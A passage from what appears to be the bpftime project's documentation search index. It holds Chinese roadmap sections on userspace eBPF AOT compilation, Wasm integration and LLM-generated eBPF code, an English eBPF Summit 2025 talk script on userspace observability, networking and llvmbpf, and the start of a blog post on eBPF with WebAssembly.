<p><code>bpftime</code>\u4e3a\u7528\u6237\u7a7a\u95f4\u548c\u5185\u6838\u7a7a\u95f4\u7684\u534f\u540c\u5de5\u4f5c\u5f00\u8f9f\u4e86\u65b0\u7684\u53ef\u80fd\u6027\uff0c\u65e0\u8bba\u662f\u5728\u6587\u4ef6\u7cfb\u7edf\u8fd8\u662f\u7f51\u7edc\u901a\u4fe1\u65b9\u9762\u3002\u8fd9\u79cd\u534f\u540c\u4f18\u5316\u4e3a\u6211\u4eec\u63d0\u4f9b\u4e86\u4e00\u4e2a\u9ad8\u6548\u3001\u7075\u6d3b\u5e76\u4e14\u53ef\u81ea\u5b9a\u4e49\u7684\u6846\u67b6\uff0c\u53ef\u4ee5\u6ee1\u8db3\u73b0\u4ee3\u590d\u6742\u8ba1\u7b97\u73af\u5883\u7684\u9700\u6c42\u3002\u672a\u6765\uff0c\u8fd9\u79cd\u534f\u540c\u5de5\u4f5c\u6a21\u5f0f\u6709\u53ef\u80fd\u6210\u4e3a\u64cd\u4f5c\u7cfb\u7edf\u548c\u5e94\u7528\u4e4b\u95f4\u4ea4\u4e92\u7684\u6807\u51c6\u65b9\u5f0f\u3002</p>"},{"location":"others/miscellaneous/roadmap/#5-aot-ebpf","title":"5. \u7528\u6237\u6001 AOT \u7f16\u8bd1\u4e0e\u8fd0\u884c eBPF\uff1a\u8f7b\u91cf\u7ea7\u5bb9\u5668\u7684\u65b0\u673a\u9047","text":"<p>\u80cc\u666f\uff1a</p> <p>\u5728\u4e91\u539f\u751f\u3001IoT \u548c\u5d4c\u5165\u5f0f\u7cfb\u7edf\u9886\u57df\uff0c\u8d44\u6e90\u53d7\u9650\u3001\u5b89\u5168\u6027\u8981\u6c42\u9ad8\u3001\u90e8\u7f72\u4e0e\u7ba1\u7406\u9700\u8981\u9ad8\u5ea6\u81ea\u52a8\u5316\u662f\u4e09\u5927\u6838\u5fc3\u6311\u6218\u3002\u73b0\u6709\u7684\u5bb9\u5668\u6280\u672f\uff0c\u5c3d\u7ba1\u63d0\u4f9b\u4e86\u9ad8\u5ea6\u7684\u62bd\u8c61\u548c\u9694\u79bb\uff0c\u4f46\u4ecd\u7136\u5e26\u6765\u4e86\u8fd0\u884c\u65f6\u7684\u5f00\u9500\u3002\u7528\u6237\u6001 eBPF \u7684\u6f5c\u5728\u80fd\u529b\uff0c\u7279\u522b\u662f\u5176Ahead-of-Time (AOT) \u7f16\u8bd1\u4e3a\u673a\u5668\u7801\u5e76\u7b7e\u540d\u7684\u7279\u6027\uff0c\u4e3a\u8fd9\u4e9b\u9886\u57df\u5e26\u6765\u4e86\u65b0\u7684\u53ef\u80fd\u6027\u3002</p> <p>\u76ee\u6807\uff1a</p> <ol> <li>\u5f00\u53d1\u4e00\u4e2a\u7528\u6237\u6001 eBPF \u7684 AOT \u7f16\u8bd1\u4e0e\u8fd0\u884c\u673a\u5236\uff0c\u65e8\u5728\u4e3a\u5d4c\u5165\u5f0f\u548c\u8d44\u6e90\u53d7\u9650\u73af\u5883\u63d0\u4f9b\u8f7b\u91cf\u7ea7\u7684\u3001\u4e8b\u4ef6\u9a71\u52a8\u7684\u8ba1\u7b97\u6a21\u578b\u3002</li> <li>\u5c06\u6b64\u6280\u672f\u878d\u5165 FaaS \u8f7b\u91cf\u7ea7\u5bb9\u5668\uff0c\u4ece\u800c\u964d\u4f4e\u5176\u542f\u52a8\u5ef6\u8fdf\uff0c\u5e76\u63d0\u9ad8\u6267\u884c\u6548\u7387\u3002</li> <li>\u8bbe\u8ba1\u548c\u5b9e\u65bd\u4e00\u4e2a\u63d2\u4ef6\u7cfb\u7edf\uff0c\u5141\u8bb8 eBPF \u7a0b\u5e8f\u5d4c\u5165\u5230\u5176\u4ed6\u5e94\u7528\u4e2d\uff0c\u4e3a\u5176\u63d0\u4f9b\u52a8\u6001\u7684\u3001\u9ad8\u5ea6\u4f18\u5316\u7684\u529f\u80fd\u6269\u5c55\u3002</li> </ol> <p>\u6311\u6218\uff1a</p> <ol> <li>\u6027\u80fd\u4e0e\u5b89\u5168\u5e73\u8861\uff1a\u5982\u4f55\u5728\u4fdd\u8bc1eBPF\u7a0b\u5e8f\u7684\u6027\u80fd\u7684\u540c\u65f6\uff0c\u786e\u4fdd\u5176\u5728\u7528\u6237\u6001\u7684\u5b8c\u5168\u5b89\u5168\u6027\uff0c\u7279\u522b\u662f\u5728\u6ca1\u6709\u5185\u6838\u7ea7\u522b\u9694\u79bb\u7684\u60c5\u51b5\u4e0b\u3002</li> <li>\u901a\u7528\u6027\u4e0e\u7279\u5b9a\u6027\uff1a\u8bbe\u8ba1\u4e00\u4e2a\u7cfb\u7edf\uff0c\u65e2\u8981\u6ee1\u8db3\u5d4c\u5165\u5f0f\u548cIoT\u8bbe\u5907\u7684\u7279\u5b9a\u9700\u6c42\uff0c\u53c8\u8981\u5177\u6709\u8db3\u591f\u7684\u901a\u7528\u6027\uff0c\u4ee5\u9002\u5e94\u4e0d\u540c\u7684\u5e94\u7528\u573a\u666f\u3002</li> <li>\u517c\u5bb9\u4e0e\u521b\u65b0\uff1a\u5982\u4f55\u786e\u4fdd\u65b0\u6280\u672f\u4e0e\u73b0\u6709\u7684\u5bb9\u5668\u751f\u6001\u7cfb\u7edf\u548cIoT\u6807\u51c6\u517c\u5bb9\uff0c\u540c\u65f6\u5f15\u5165\u521b\u65b0\u3002</li> </ol> <p>\u53ef\u80fd\u6027\uff1a</p> <ol> <li>\u4f4e\u5f00\u9500\u7684\u8ba1\u7b97\uff1aeBPF \u7684\u8f7b\u91cf\u7ea7\u7279\u6027\u548cAOT\u7f16\u8bd1\u4e3a\u673a\u5668\u7801\u7684\u80fd\u529b\uff0c\u53ef\u4ee5\u663e\u8457\u964d\u4f4e\u5728\u53d7\u9650\u8d44\u6e90\u73af\u5883\u4e0b\u7684\u8ba1\u7b97\u5f00\u9500\u3002</li> <li>\u52a8\u6001\u6269\u5c55\u6027\uff1a\u901a\u8fc7\u5c06 eBPF \u7a0b\u5e8f\u4f5c\u4e3a\u63d2\u4ef6\u5d4c\u5165\u5230\u5176\u4ed6\u5e94\u7528\u4e2d\uff0c\u4e3a\u5404\u79cd\u5e94\u7528\u63d0\u4f9b\u9ad8\u5ea6\u52a8\u6001\u7684\u3001\u6309\u9700\u52a0\u8f7d\u7684\u529f\u80fd\u3002</li> <li>\u8de8\u5e73\u53f0\u548c\u591a\u573a\u666f\u5e94\u7528\uff1aeBPF \u7a0b\u5e8f\u7684\u53ef\u79fb\u690d\u6027\u548c\u5b89\u5168\u6027\u4f7f\u5176\u6210\u4e3a\u591a\u79cd\u5e73\u53f0\u548c\u5e94\u7528\u573a\u666f\u7684\u7406\u60f3\u9009\u62e9\uff0c\u5305\u62ec\u8fb9\u7f18\u8ba1\u7b97\u3001\u667a\u80fd\u5bb6\u5c45\u3001\u8f66\u8f7d\u7cfb\u7edf\u7b49\u3002</li> </ol> <p>\u7528\u6237\u6001 eBPF \u7684 AOT \u7f16\u8bd1\u4e0e\u8fd0\u884c\u63d0\u4f9b\u4e86\u4e00\u4e2a\u72ec\u7279\u7684\u3001\u5177\u6709\u9ad8\u5ea6\u6f5c\u529b\u7684\u65b9\u6cd5\uff0c\u6ee1\u8db3\u4e91\u539f\u751f\u3001IoT \u548c\u5d4c\u5165\u5f0f\u7cfb\u7edf\u9886\u57df\u7684\u6311\u6218\u548c\u9700\u6c42\u3002\u5176\u72ec\u7279\u7684\u7ed3\u5408\u6027\u80fd\u3001\u5b89\u5168\u6027\u548c\u7075\u6d3b\u6027\u7684\u7279\u70b9\u4f7f\u5176\u6210\u4e3a\u8fd9\u4e9b\u9886\u57df\u672a\u6765\u7814\u7a76\u548c\u521b\u65b0\u7684\u91cd\u8981\u65b9\u5411\u3002</p>"},{"location":"others/miscellaneous/roadmap/#6-bpftime-wasm-enhance-wasm-with-ebpf","title":"6. bpftime + Wasm: enhance Wasm with eBPF","text":"<p>\u7ed3\u5408WebAssembly (Wasm) \u548c\u7528\u6237\u6001\u7684 eBPF \u662f\u4e00\u4e2a\u9887\u5177\u524d\u666f\u7684\u6784\u60f3\u3002WebAssembly \u4f5c\u4e3a\u4e00\u4e2a\u4e3a\u73b0\u4ee3\u7f51\u7edc\u5e94\u7528\u8bbe\u8ba1\u7684\u8f7b\u91cf\u7ea7\u865a\u62df\u673a\uff0c\u63d0\u4f9b\u4e86\u8de8\u5e73\u53f0\u548c\u9ad8\u6548\u7684\u6267\u884c\u73af\u5883\u3002eBPF\uff0c\u5219\u4e3a\u6211\u4eec\u63d0\u4f9b\u4e86\u52a8\u6001\u3001\u9ad8\u6548\u548c\u5b89\u5168\u7684\u7cfb\u7edf\u7ea7\u4ee3\u7801\u6ce8\u5165\u673a\u5236\u3002\u5c06\u4e24\u8005\u7ed3\u5408\uff0c\u4e0d\u4ec5\u53ef\u4ee5\u4e3a Wasm \u5e26\u6765\u66f4\u4e30\u5bcc\u7684\u7cfb\u7edf\u7ea7\u529f\u80fd\uff0c\u8fd8\u53ef\u4ee5\u4e3a\u5176\u63d0\u4f9b\u66f4\u9ad8\u7684\u8fd0\u884c\u6548\u7387\u3002</p> <p>\u6838\u5fc3\u601d\u8003\u4e0e\u53ef\u80fd\u6027:</p> <ol> <li>\u52a8\u6001\u8ffd\u8e2a\u4e0e\u53ef\u89c2\u6d4b\u6027: \u5229\u7528 eBPF \u7684\u52a8\u6001\u8ffd\u8e2a\u80fd\u529b\uff0cWasm \u865a\u62df\u673a\u4e2d\u53ef\u4ee5\u5b9e\u73b0\u7c7b\u4f3c kprobe \u7684\u529f\u80fd\uff0c\u5b9e\u65f6\u8ffd\u8e2a Wasm \u4ee3\u7801\u7684\u8fd0\u884c\u72b6\u6001\u3002\u8fd9\u4e0d\u4ec5\u53ef\u4ee5\u7528\u4e8e\u6027\u80fd\u5206\u6790\u548c\u6545\u969c\u8bca\u65ad\uff0c\u8fd8\u53ef\u4ee5\u4e3a\u5b89\u5168\u548c\u5ba1\u8ba1\u63d0\u4f9b\u6709\u529b\u7684\u652f\u6301\u3002</li> <li>\u7f51\u7edc\u4e0e\u8d44\u6e90\u9694\u79bb: eBPF \u7684 socket \u8fc7\u6ee4\u548c\u6d41\u91cf\u63a7\u5236\u529f\u80fd\u53ef\u4ee5\u4e3a Wasm \u63d0\u4f9b\u66f4\u7cbe\u7ec6\u548c\u9ad8\u6548\u7684\u7f51\u7edc\u9694\u79bb\u80fd\u529b\uff0c\u786e\u4fdd Wasm \u5e94\u7528\u4e4b\u95f4\u7684\u5b89\u5168\u9694\u79bb\u3002\u540c\u65f6\uff0ceBPF \u8fd8\u53ef\u4ee5\u7528\u4e8e\u52a8\u6001\u914d\u7f6e Wasi \u7684\u8d44\u6e90\u9694\u79bb\u6a21\u578b\uff0c\u4e3a\u6bcf\u4e2a Wasm \u5e94\u7528\u63d0\u4f9b\u7cbe\u7ec6\u7684\u8d44\u6e90\u63a7\u5236\u3002\u4e4b\u524d\u4e5f\u6709\u5176\u4ed6\u4eba\u505a\u4e86\u4e00\u4e9b\u522b\u7684\u76f8\u5173\u7684\u5c1d\u8bd5\uff0c\u6bd4\u5982 POSTER: Leveraging eBPF to enhance sandboxing of WebAssembly runtimes</li> <li>\u53ef\u79fb\u690d\u6027\u4e0e\u72ec\u7acb\u6027: \u7531\u4e8eWasm\u7684\u8bbe\u8ba1\u76ee\u6807\u662f\u8de8\u5e73\u53f0\u548c\u53ef\u79fb\u690d\u6027\uff0c\u7ed3\u5408\u7528\u6237\u6001\u7684eBPF\u53ef\u4ee5\u786e\u4fdd\u8fd9\u4e00\u76ee\u6807\u4e0d\u53d7\u5f71\u54cd\u3002eBPF\u4ee3\u7801\u53ef\u4ee5\u5728\u4efb\u4f55\u652f\u6301Wasm\u548ceBPF\u7684\u5e73\u53f0\u4e0a\u8fd0\u884c\uff0c\u65e0\u9700\u4f9d\u8d56\u7279\u5b9a\u7684\u5185\u6838\u7248\u672c\u6216\u64cd\u4f5c\u7cfb\u7edf\u3002</li> <li>\u751f\u6001\u4e0e\u5f00\u53d1\u96be\u5ea6: \u4f60\u63d0\u5230\u7684eBPF\u7684\u591a\u8bed\u8a00\u751f\u6001\u95ee\u9898\u548c\u5f00\u53d1\u96be\u5ea6\uff0c\u786e\u5b9e\u662f\u4e00\u4e2a\u6311\u6218\u3002\u4f46\u968f\u7740eBPF\u751f\u6001\u7684\u65e5\u76ca\u4e30\u5bcc\u548c\u6210\u719f\uff0c\u8fd9\u4e00\u95ee\u9898\u6709\u671b\u5f97\u5230\u7f13\u89e3\u3002\u800cWasm\u5219\u4e3a\u5f00\u53d1\u8005\u63d0\u4f9b\u4e86\u4e00\u4e2a\u719f\u6089\u548c\u53cb\u597d\u7684\u7f16\u7a0b\u6a21\u578b\uff0c\u53ef\u4ee5\u7528\u4e8e\u5f00\u53d1\u5177\u4f53\u7684\u4e1a\u52a1\u903b\u8f91\u3002</li> <li>\u6269\u5c55\u6027: \u7ed3\u5408eBPF\u548cWasm\uff0c\u8fd8\u53ef\u4ee5\u8003\u8651\u5b9e\u73b0\u66f4\u591a\u7684\u529f\u80fd\uff0c\u4f8b\u5982\u5b9e\u65f6\u4ee3\u7801\u66f4\u65b0\u3001\u70ed\u8865\u4e01\u3001\u52a8\u6001\u8d44\u6e90\u5206\u914d\u7b49\u3002</li> </ol> <p>\u6311\u6218\u4e0e\u62d3\u5c55:</p> <ol> <li>\u5b89\u5168\u6027: eBPF\u548cWasm\u90fd\u6709\u5404\u81ea\u7684\u5b89\u5168\u6a21\u578b\uff0c\u7ed3\u5408\u4f7f\u7528\u65f6\u9700\u8981\u786e\u4fdd\u4e24\u8005\u7684\u5b89\u5168\u6027\u80fd\u591f\u76f8\u4e92\u589e\u5f3a\uff0c\u800c\u4e0d\u662f\u76f8\u4e92\u524a\u5f31\u3002</li> <li>\u6027\u80fd: \u5c3d\u7ba1eBPF\u548cWasm\u90fd\u662f\u4e3a\u9ad8\u6548\u800c\u8bbe\u8ba1\u7684\uff0c\u4f46\u5728\u5b9e\u9645\u4f7f\u7528\u4e2d\u53ef\u80fd\u4f1a\u9762\u4e34\u4e00\u4e9b\u6027\u80fd\u6311\u6218\uff0c\u5982\u4ee3\u7801\u6ce8\u5165\u3001\u52a8\u6001\u8ffd\u8e2a\u7b49\u3002\u9700\u8981\u8fdb\u884c\u6df1\u5165\u7684\u6027\u80fd\u5206\u6790\u548c\u4f18\u5316\u3002</li> <li>\u5de5\u5177\u548c\u751f\u6001: \u7ed3\u5408eBPF\u548cWasm\u53ef\u80fd\u9700\u8981\u5f00\u53d1\u65b0\u7684\u5de5\u5177\u548c\u6846\u67b6\uff0c\u652f\u6301\u5f00\u53d1\u3001\u90e8\u7f72\u548c\u7ba1\u7406\u8fd9\u79cd\u65b0\u578b\u5e94\u7528\u3002\u8fd9\u65f6\u5019\u6211\u4eec\u505a\u7684 <code>Wasm-bpf</code> \u5c31\u53ef\u4ee5\u53d1\u6325\u4f5c\u7528\u4e86\u3002</li> </ol> <p>\u7ed3\u5408\u7528\u6237\u6001\u7684 eBPF \u548c WebAssembly \u662f\u4e00\u4e2a\u5177\u6709\u6f5c\u529b\u7684\u65b9\u5411\uff0c\u53ef\u4ee5\u4e3a\u73b0\u4ee3\u5e94\u7528\u63d0\u4f9b\u66f4\u4e30\u5bcc\u3001\u66f4\u9ad8\u6548\u548c\u66f4\u5b89\u5168\u7684\u529f\u80fd\u3002\u4f46\u8fd9\u540c\u65f6\u4e5f\u5e26\u6765\u4e86\u4e00\u7cfb\u5217\u7684\u6280\u672f\u6311\u6218\uff0c\u9700\u8981\u8fdb\u884c\u6df1\u5165\u7684\u7814\u7a76\u548c\u63a2\u7d22\u3002</p>"},{"location":"others/miscellaneous/roadmap/#7-bpftime-llm-ebpf","title":"7. bpftime + LLM \u81ea\u52a8\u751f\u6210 eBPF \u4ee3\u7801\uff0c\u4e3a\u7528\u6237\u7a7a\u95f4\u6027\u80fd\u5206\u6790\u3001\u6570\u636e\u6574\u5408\u548c\u52a8\u6001\u63d2\u6869\u63d0\u4f9b\u5168\u65b0\u673a\u5236","text":"<p>\u80cc\u666f\uff1a</p> <p>\u968f\u7740\u590d\u6742\u7cfb\u7edf\u7684\u6f14\u8fdb\uff0c\u4e0d\u4ec5\u4ec5\u662f\u7f16\u5199\u6709\u6548\u7684 eBPF \u4ee3\u7801\u53d8\u5f97\u5177\u6709\u6311\u6218\u6027\uff0c\u8fd8\u6709\u5728\u7528\u6237\u6001\u548c\u5185\u6838\u6001\u4e4b\u95f4\u5bf9\u6570\u636e\u8fdb\u884c\u6df1\u5165\u5173\u8054\u548c\u6574\u7406\u7684\u9700\u6c42\u3002\u5f53\u524d\uff0c\u5e02\u573a\u4e0a\u7f3a\u4e4f\u80fd\u591f\u7ed3\u5408\u8bed\u4e49\u4fe1\u606f\uff08\u5982\u53d8\u91cf\u540d\u3001\u4ee3\u7801\u6ce8\u91ca\u7b49\uff09\u4e0e\u5b9e\u9645\u91c7\u96c6\u5230\u7684\u6570\u636e\u8fdb\u884c\u81ea\u52a8\u5316\u5206\u6790\u7684\u89e3\u51b3\u65b9\u6848\u3002bpftime \u4f5c\u4e3a\u4e00\u4e2a\u5728\u7528\u6237\u6001\u6267\u884c eBPF \u7684\u5de5\u5177\uff0c\u4e0e\u5927\u578b\u8bed\u8a00\u6a21\u578b\uff08\u5982 GPT-4\uff09\u76f8\u7ed3\u5408\uff0c\u53ef\u80fd\u4e3a\u8fd9\u4e00\u9886\u57df\u5e26\u6765\u9769\u547d\u6027\u7684\u53d8\u9769\u3002</p> <p>\u76ee\u6807\uff1a</p> <ol> <li>\u5229\u7528 bpftime \u548c GPT-4 \u521b\u5efa\u4e00\u4e2a\u6846\u67b6\uff0c\u80fd\u591f\u81ea\u52a8\u751f\u6210\u9ad8\u6548\u7684 eBPF \u4ee3\u7801\uff0c\u5e76\u7406\u89e3\u6027\u80fd\u5206\u6790\u7684\u590d\u6742\u9700\u6c42\u3002</li> <li>\u8bbe\u8ba1\u673a\u5236\uff0c\u5c06\u5185\u6838\u6001\u548c\u7528\u6237\u6001\u7684\u6570\u636e\u8fdb\u884c\u5173\u8054\u4e0e\u6574\u5408\uff0c\u5e76\u7ed3\u5408\u8bed\u4e49\u4fe1\u606f\u4e3a\u5f00\u53d1\u8005\u63d0\u4f9b\u6709\u6df1\u5ea6\u7684\u6d1e\u89c1\u3002</li> <li>\u5229\u7528\u7528\u6237\u6001\u7684\u7075\u6d3b\u6027\uff0c\u4e3a bpftime \u5f00\u53d1\u81ea\u52a8\u6570\u636e\u6d41\u751f\u6210\u3001\u9519\u8bef\u6ce8\u5165\u3001\u5b9e\u65f6\u8865\u4e01\u7b49\u529f\u80fd\uff0c\u4ee5\u5f3a\u5316\u5176\u52a8\u6001\u8ffd\u8e2a\u80fd\u529b\u3002</li> </ol> <p>\u6311\u6218\uff1a</p> <ol> <li>\u8bed\u4e49\u6574\u5408\uff1a\u81ea\u52a8\u8bc6\u522b\u548c\u6574\u5408\u4ee3\u7801\u4e2d\u7684\u8bed\u4e49\u4fe1\u606f\u4e0e\u5b9e\u9645\u6570\u636e\u662f\u4e00\u9879\u5de8\u5927\u7684\u6311\u6218\u3002\u8fd9\u9700\u8981\u6df1\u5ea6\u7406\u89e3\u4ee3\u7801\u3001\u6ce8\u91ca\u3001\u53d8\u91cf\u540d\u7b49\uff0c\u4ee5\u53ca\u5b83\u4eec\u5982\u4f55\u4e0e\u5b9e\u9645\u6570\u636e\u5173\u8054\u3002</li> <li>\u6570\u636e\u6d41\u751f\u6210\u4e0e\u9519\u8bef\u6ce8\u5165\uff1a\u5728\u7528\u6237\u6001\u81ea\u52a8\u751f\u6210\u6570\u636e\u6d41\u4ee5\u8fdb\u884c\u6d4b\u8bd5\uff0c\u540c\u65f6\u8fdb\u884c\u9519\u8bef\u6ce8\u5165\uff0c\u9700\u8981\u4e00\u4e2a\u7cbe\u786e\u4e14\u53ef\u9760\u7684\u673a\u5236\uff0c\u4ee5\u786e\u4fdd\u6d4b\u8bd5\u7ed3\u679c\u7684\u51c6\u786e\u6027\u5e76\u4e0d\u4f1a\u5bf9\u751f\u4ea7\u73af\u5883\u9020\u6210\u5371\u5bb3\u3002</li> <li>\u5b9e\u65f6\u8865\u4e01\u6280\u672f\uff1a\u5b9e\u65f6\u5730\u5728\u7528\u6237\u6001\u5bf9\u4ee3\u7801\u8fdb\u884c\u8865\u4e01\u662f\u4e00\u9879\u6280\u672f\u6311\u6218\uff0c\u9700\u8981\u786e\u4fdd\u8865\u4e01\u4e0d\u4f1a\u5f15\u5165\u65b0\u7684\u9519\u8bef\u6216\u6027\u80fd\u95ee\u9898\u3002</li> </ol> <p>\u53ef\u80fd\u6027\uff1a</p> <ol> <li>\u6df1\u5ea6\u5206\u6790\uff1a\u7ed3\u5408\u5185\u6838\u6001\u548c\u7528\u6237\u6001\u6570\u636e\uff0c\u4ee5\u53ca\u4e0e\u4ee3\u7801\u7684\u8bed\u4e49\u4fe1\u606f\u5173\u8054\uff0c\u80fd\u4e3a\u5f00\u53d1\u8005\u63d0\u4f9b\u66f4\u6df1\u5165\u7684\u6027\u80fd\u548c\u884c\u4e3a\u5206\u6790\u3002</li> <li>\u81ea\u52a8\u5316\u6d4b\u8bd5\u4e0e\u9519\u8bef\u6ce8\u5165\uff1a\u5229\u7528 bpftime \u7684\u7075\u6d3b\u6027\uff0c\u53ef\u4ee5\u5728\u7528\u6237\u6001\u81ea\u52a8\u5316\u5730\u751f\u6210\u5404\u79cd\u6570\u636e\u6d41\u3001\u6ce8\u5165\u9519\u8bef\uff0c\u63d0\u4f9b\u5168\u9762\u7684\u6d4b\u8bd5\u8986\u76d6\u3002</li> <li>\u52a8\u6001\u4fee\u8865\u4e0e\u5b9e\u65f6\u53cd\u5e94\uff1a\u4e3a\u4ee3\u7801\u5728\u8fd0\u884c\u65f6\u5e94\u7528\u8865\u4e01\uff0c\u4e0d\u4ec5\u53ef\u4ee5\u5feb\u901f\u54cd\u5e94\u95ee\u9898\uff0c\u8fd8\u53ef\u4ee5\u4f18\u5316\u6027\u80fd\uff0c\u6ee1\u8db3\u7cfb\u7edf\u7684\u52a8\u6001\u9700\u6c42\u3002</li> </ol> <p>\u7ed3\u5408 bpftime \u548c\u5927\u578b\u8bed\u8a00\u6a21\u578b\uff0c\u81ea\u52a8\u5316\u5730\u751f\u6210 eBPF \u4ee3\u7801\u3001\u5173\u8054\u5185\u6838\u6001\u4e0e\u7528\u6237\u6001\u6570\u636e\u3001\u5e76\u5b9e\u65bd\u52a8\u6001\u63d2\u6869\uff0c\u4e3a\u6027\u80fd\u5206\u6790\u548c\u7cfb\u7edf\u4f18\u5316\u63d0\u4f9b\u4e86\u4e00\u4e2a\u5177\u6709\u6f5c\u529b\u7684\u7814\u7a76\u65b9\u5411\u3002\u5c3d\u7ba1\u5b58\u5728\u4e00\u4e9b\u6280\u672f\u548c\u5b9e\u65bd\u6311\u6218\uff0c\u4f46\u8003\u8651\u5230\u6f5c\u5728\u7684\u957f\u671f\u6536\u76ca\uff0c\u8fd9\u4e00\u7814\u7a76\u8bfe\u9898\u65e0\u7591\u662f\u503c\u5f97\u8fdb\u4e00\u6b65\u63a2\u7d22\u7684\u3002</p> <p>Share on  Share on </p>"},{"location":"others/miscellaneous/talk-ebpf-summit/","title":"eBPF Summit 2025 bpftime talk","text":""},{"location":"others/miscellaneous/talk-ebpf-summit/#slide-1-bpftime-userspace-ebpf-runtime","title":"Slide 1: bpftime: Userspace eBPF Runtime","text":"<p>\u201cHello, everyone. I\u2019m Yusheng Zheng, and today, I\u2019m excited to talk about bpftime, a userspace eBPF runtime for network and observability. </p> <p>You may remember bpftime from last year's Linux Plumber, but we\u2019ve made a lot of progress since then. </p> <p>So, what is bpftime? It\u2019s a userspace eBPF runtime that supports tracing features like Uprobe, USDT, syscall tracepoints, and even network features like XDP, all in userspace. It supports more than 10 map types and 30 helpers, so it\u2019s highly compatible with the kernel eBPF ecosystem. </p> <p>you can use your fammiliar way to develop and deploy eBPF programs, but in userspace. bpftime can run alongside kernel eBPF, using kernel eBPF maps and working together with kprobe. It can now using either ubpf, which already used by eBPF for windoes, or a new eBPF VM called llvmbpf as its virtual machine for execution.</p>"},{"location":"others/miscellaneous/talk-ebpf-summit/#slide-2-bpftime-for-observability","title":"Slide 2: bpftime for Observability","text":"<p>\u201cSo why do we want to do observability with eBPF in userspace?</p> <p>It\u2019s simple: userspace tracing is faster and more flexible. For example, Uprobes in the kernel take about 1000 nanoseconds, but in userspace, we\u2019ve brought that down to just 100 nanoseconds. Similarly, memory access in userspace is about 10 times faster\u20144 nanoseconds versus 40 nanoseconds in the kernel. This speed difference happens because the kernel often has to translate memory addresses or run additional checks to access userspace memory.</p> <p>On top of that, there\u2019s less overhead on untraced processes, especially when dealing with syscall tracepoints.</p> <p>What can we run in userspace?</p> <p>With userspace tracing, tools like bcc and bpftrace  can run completely in userspace where kernel eBPF is not available. And you can run more complex observability agents that combine kprobes and uprobes, improving performance by shifting part of the workload to userspace.</p>"},{"location":"others/miscellaneous/talk-ebpf-summit/#slide-3-bpftime-for-userspace-network","title":"Slide 3: bpftime for Userspace Network","text":"<p>\u201cNow, let\u2019s talk about bpftime in the networking context. Why using userspace eBPF instead of running ebpf in kernel?</p> <p>We\u2019ve seen kernel-bypass solutions like DPDK and AF_XDP. They can offer faster packet processing by bypassing the kernel. But with bpftime, you can combine the performance benefits of these kernel-bypass technologies with the extensive eBPF ecosystem. So, you get the best of both low-latency packet processing and the ability to use eBPF\u2019s safety and existing tools.</p> <p>We can  also use LLVM optimizations to further boost performance in userspace.\u201d</p>"},{"location":"others/miscellaneous/talk-ebpf-summit/#slide-4-use-bpftime-with-userspace-network","title":"Slide 4: Use bpftime with Userspace Network","text":"<p>\u201cUsing bpftime, you can seamlessly integrate the eBPF XDP ecosystem into kernel-bypass applications. </p> <p>For instance, solutions like Katran, a high-performance load balancer, can benefit from the optimizations we\u2019ve made in bpftime for userspace. </p> <p>bpftime can work with both AF_XDP and DPDK. You can run your XDP eBPF programs as if they were in the kernel, just load them with bpftime, and they\u2019ll work like normal, while a DPDK app handles the network processing.</p> <p>Right now, there are some limitations with XDP_TX and XDP_DROP in userspace, but we\u2019re actively working on solutions. We\u2019re exploring ways to reinject packets into the kernel to support XDP_PASS.\u201d</p>"},{"location":"others/miscellaneous/talk-ebpf-summit/#slide-5-control-plane-support-for-userspace-ebpf","title":"Slide 5: Control Plane Support for Userspace eBPF","text":"<p>\u201cOne of the core features that allows bpftime to remain compatible with the existing eBPF ecosystem is its control plane support for userspace eBPF.</p> <p>Control planes in eBPF are usually responsible for tasks like loading and unloading programs,  configuring maps, and providing monitoring and debugging interfaces. bpftime can fully supports this in userspace by hooking syscalls using LD_PRELOAD or kernel eBPF, and connect to the userspace runtime.</p>"},{"location":"others/miscellaneous/talk-ebpf-summit/#slide-6-benchmark","title":"Slide 6: Benchmark","text":"<p>\u201cNow, let\u2019s see the performance benchmarks. </p> <p>We\u2019ve benchmarked a variety of eBPF programs running with bpftime. bpftime has achieved up to 3x faster performance in simple XDP network functions. In real-world applications like Katran, bpftime can acheive up to  40% faster.</p> <p>This shows that userspace eBPF can be fasyer kernel-based solutions, while retaining the flexibility that makes eBPF powerful.\u201d</p>"},{"location":"others/miscellaneous/talk-ebpf-summit/#slide-7-llvmbpf-ebpf-vm-with-llvm-jitaot","title":"Slide 7: llvmbpf: eBPF VM with LLVM JIT/AOT","text":"<p>\u201cLet\u2019s talk about llvmbpf. Originally, llvmbpf was part of the bpftime repo,  but we\u2019ve now separated it into a standalone project. llvmbpf is an eBPF virtual machine and compiler tool specifically optimized for userspace.</p> <p>We\u2019ve tested it with bpf_conformance for ompatibility, you can see it in CI.  it can have better performance, and we can easily experiment different Optimization such as Inline helpers. The  llvmbpf also supports both JIT and AOT compilation, depending on your needs.\u201d</p>"},{"location":"others/miscellaneous/talk-ebpf-summit/#slide-8-llvmbpf-build-into-standalone-binary","title":"Slide 8: llvmbpf: Build into Standalone Binary","text":"<p>llvmbpf also aupports building eBPF programs into standalone binaries, where you can call eBPF module like a simple C code, and Using eBPF bytecode as IR for verification. Maps and helpers are also supported. you don\u2019t need any external dependencies</p> <p>This can makes it easyer to deploy eBPF programs on any machine, including embedded systems and microcontrollers, which often don\u2019t have an OS or runtime support for eBPF.</p>"},{"location":"others/miscellaneous/talk-ebpf-summit/#conclusion","title":"Conclusion","text":"<p>In conclusion, bpftime are more than just userspace tracing and network performance.  we hope it can bring the power of the eBPF ecosystem into userspace, without compromising on speed or flexibility.</p> <p>I encourage all of you to explore bpftime for your observability and network needs. Thanks for professor marios from imperial college london, and Thank you for your time, and feel free to check out the repo on GitHub or ask me any questions. </p> <p>Share on  Share on </p>"},{"location":"others/miscellaneous/wasm-bpf-kubecon/","title":"Securing and Simplifying eBPF Deployments with WebAssembly","text":"<p>Extended Berkeley Packet Filter (eBPF) and WebAssembly (Wasm) are emerging as powerful technologies for enhancing system capabilities in cloud-native environments. However, deploying eBPF programs at scale presents challenges. This blog explores how integrating eBPF programs with WebAssembly runtimes like WasmEdge addresses these challenges by enabling lightweight, portable, and secure execution of eBPF workloads. The integration streamlines eBPF deployment in Kubernetes through Wasm's pluggable model while improving security with fine-grained access controls. Examples also demonstrate enhanced observability, debugging and access control for Wasm through this integration of eBPF and Wasm.</p>"},{"location":"others/miscellaneous/wasm-bpf-kubecon/#introduction","title":"introduction","text":"<p>Extended Berkeley Packet Filter (eBPF) and WebAssembly (Wasm) are emerging technologies that are playing important roles in modern cloud-native ecosystems. This blog post explores how these technologies can be combined to enhance system observability and security in innovative ways.</p> <p>eBPF provides a powerful yet lightweight framework for running sandboxed programs securely within the 